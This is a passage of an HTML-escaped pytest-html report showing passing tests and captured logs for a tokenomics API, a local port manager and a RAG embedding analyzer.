TestPoCAPI.test_tokenomics_statistics - INFO - Found 2 existing contributions\n2025-12-18 09:24:45,821 - TestPoCAPI.test_tokenomics_statistics - INFO - Testing tokenomics statistics endpoint\n2025-12-18 09:24:45,822 - TestPoCAPI.test_tokenomics_statistics - INFO - Total allocated SYNTH: 0.0\n\n------------------------------ Captured log call -------------------------------\nWARNING  TestPoCAPI.test_tokenomics_statistics:test_framework.py:400 frontend not available: Service unreachable: HTTPConnectionPool(host=&amp;#x27;localhost&amp;#x27;, port=3001): Max retries exceeded with url: / (Caused by NewConnectionError(&amp;#x27;&amp;lt;urllib3.connection.HTTPConnection object at 0x146580af0&amp;gt;: Failed to establish a new connection: [Errno 61] Connection refused&amp;#x27;))\nINFO     TestPoCAPI.test_tokenomics_statistics:test_framework.py:390 Found 2 existing contributions\nINFO     TestPoCAPI.test_tokenomics_statistics:test_framework.py:390 Testing tokenomics statistics endpoint\nINFO     TestPoCAPI.test_tokenomics_statistics:test_framework.py:390 Total allocated SYNTH: 0.0\n\n&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_check_port_available_free&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_check_port_available_free&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_check_port_available_free&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_check_port_available_in_use&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_check_port_available_in_use&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_check_port_available_in_use&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_detect_platform&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_detect_platform&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_detect_platform&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_free_port_already_free&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_free_port_already_free&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_free_port_already_free&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_free_port_failure&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_free_port_failure&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_free_port_failure&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;------------------------------ Captured log call -------------------------------\nWARNING  scripts.startup.port_manager:port_manager.py:237 Port 65530 still in use after cleanup attempt 1\nERROR    scripts.startup.port_manager:port_manager.py:240 \u274c Could not free port 65530 (Test Service) after 2 attempts\n\n&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_free_port_success&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_free_port_success&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_free_port_success&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_get_port_status&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_get_port_status&#34;, &#34;duration&#34;: &#34;42 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_get_port_status&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;42 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_get_process_info_lsof_not_found&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_get_process_info_lsof_not_found&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_get_process_info_lsof_not_found&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;------------------------------ Captured log call -------------------------------\nERROR    scripts.startup.port_manager:port_manager.py:58 Command not found: lsof\n\n&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_get_process_info_no_processes&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_get_process_info_no_processes&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_get_process_info_no_processes&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_get_process_info_success&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_get_process_info_success&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_get_process_info_success&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_is_system_service_linux&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_is_system_service_linux&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_is_system_service_linux&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_is_system_service_macos&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_is_system_service_macos&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_is_system_service_macos&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_kill_processes_on_port_retry&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_kill_processes_on_port_retry&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_kill_processes_on_port_retry&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;------------------------------ Captured log call -------------------------------\nWARNING  scripts.startup.port_manager:port_manager.py:173 Port 65530 still in use after attempt 1, retrying...\nERROR    scripts.startup.port_manager:port_manager.py:179 Could not free port 65530 after 2 attempts\n\n&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_kill_processes_on_port_success&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_kill_processes_on_port_success&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_kill_processes_on_port_success&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestPortManager::test_kill_processes_on_port_system_service&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestPortManager::test_kill_processes_on_port_system_service&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestPortManager::test_kill_processes_on_port_system_service&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;------------------------------ Captured log call -------------------------------\nWARNING  scripts.startup.port_manager:port_manager.py:145 Not killing system service AirPlay (PID: 12345) on port 65530\nWARNING  scripts.startup.port_manager:port_manager.py:188 Left 1 system services running on port 65530\n\n&#34;}], &#34;tests/test_port_manager.py::TestConvenienceFunctions::test_check_port_available_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestConvenienceFunctions::test_check_port_available_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestConvenienceFunctions::test_check_port_available_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestConvenienceFunctions::test_free_port_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestConvenienceFunctions::test_free_port_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestConvenienceFunctions::test_free_port_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestConvenienceFunctions::test_get_port_status_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestConvenienceFunctions::test_get_port_status_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestConvenienceFunctions::test_get_port_status_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestConvenienceFunctions::test_get_process_info_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestConvenienceFunctions::test_get_process_info_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestConvenienceFunctions::test_get_process_info_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_port_manager.py::TestConvenienceFunctions::test_kill_processes_on_port_convenience&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_port_manager.py::TestConvenienceFunctions::test_kill_processes_on_port_convenience&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_port_manager.py::TestConvenienceFunctions::test_kill_processes_on_port_convenience&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;No log output captured.&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_analyze_clusters&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_analyze_clusters&#34;, &#34;duration&#34;: &#34;54 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_analyze_clusters&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;54 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Analyzing clusters with 3 clusters\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Clustering completed. Silhouette score: 0.024\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:549 Analyzing clusters with 3 clusters\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:575 Clustering completed. Silhouette score: 0.024\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_compute_statistics&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_compute_statistics&#34;, &#34;duration&#34;: &#34;19 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_compute_statistics&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;19 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Computing statistics for 10 embeddings\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Statistics computation completed successfully\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:210 Computing statistics for 10 embeddings\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:346 Statistics computation completed successfully\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_compute_statistics_edge_cases&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_compute_statistics_edge_cases&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_compute_statistics_edge_cases&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Computing statistics for 1 embeddings\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Statistics computation completed successfully\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Computing statistics for 1 embeddings\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - WARNING - All embedding norms are zero - embeddings may be improperly normalized\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Statistics computation completed successfully\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Computing statistics for 1 embeddings\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Statistics computation completed successfully\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:210 Computing statistics for 1 embeddings\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:346 Statistics computation completed successfully\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:210 Computing statistics for 1 embeddings\nWARNING  rag_api.analysis.embedding_analyzer:embedding_analyzer.py:245 All embedding norms are zero - embeddings may be improperly normalized\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:346 Statistics computation completed successfully\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:210 Computing statistics for 1 embeddings\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:346 Statistics computation completed successfully\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_load_embeddings&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_load_embeddings&#34;, &#34;duration&#34;: &#34;4 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_load_embeddings&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;4 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Loading embeddings from: /private/var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpb342sx3k\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Loaded 10 chunks from test_embeddings.json\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Successfully loaded 10 embeddings from 1 files\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:64 Loading embeddings from: /private/var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmpb342sx3k\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:163 Loaded 10 chunks from test_embeddings.json\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:181 Successfully loaded 10 embeddings from 1 files\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_load_embeddings_edge_cases&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_load_embeddings_edge_cases&#34;, &#34;duration&#34;: &#34;3 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_load_embeddings_edge_cases&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;3 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Loading embeddings from: /private/var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmp4yrddjed\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - WARNING - Invalid embedding type in chunk 0 of malformed.json\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - WARNING - Chunk 1 missing &amp;#x27;embedding&amp;#x27; field in malformed.json\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - WARNING - Chunk 2 missing &amp;#x27;text&amp;#x27; field in malformed.json\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Loaded 0 chunks from malformed.json\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - WARNING - No valid embeddings found in any files, returning empty list\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Loading embeddings from: /private/var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmp4yrddjed\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Limited to first 1 files\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Loaded 5 chunks from large.json\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Successfully loaded 5 embeddings from 1 files\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:64 Loading embeddings from: /private/var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmp4yrddjed\nWARNING  rag_api.analysis.embedding_analyzer:embedding_analyzer.py:133 Invalid embedding type in chunk 0 of malformed.json\nWARNING  rag_api.analysis.embedding_analyzer:embedding_analyzer.py:116 Chunk 1 missing &amp;#x27;embedding&amp;#x27; field in malformed.json\nWARNING  rag_api.analysis.embedding_analyzer:embedding_analyzer.py:112 Chunk 2 missing &amp;#x27;text&amp;#x27; field in malformed.json\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:163 Loaded 0 chunks from malformed.json\nWARNING  rag_api.analysis.embedding_analyzer:embedding_analyzer.py:176 No valid embeddings found in any files, returning empty list\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:64 Loading embeddings from: /private/var/folders/vc/rgmbpjpj0dbg61vr54xjskc80000gn/T/tmp4yrddjed\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:74 Limited to first 1 files\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:163 Loaded 5 chunks from large.json\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:181 Successfully loaded 5 embeddings from 1 files\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_validate_embeddings&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_validate_embeddings&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_rag_analysis.py::TestEmbeddingAnalyzer::test_validate_embeddings&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Validating embeddings\n2025-12-18 09:24:45 - rag_api.analysis.embedding_analyzer - INFO - Validation passed\n\n------------------------------ Captured log call -------------------------------\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:435 Validating embeddings\nINFO     rag_api.analysis.embedding_analyzer:embedding_analyzer.py:486 Validation passed\n\n&#34;}], &#34;tests/test_rag_analysis.py::TestPCAReducer::test_explained_variance&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: 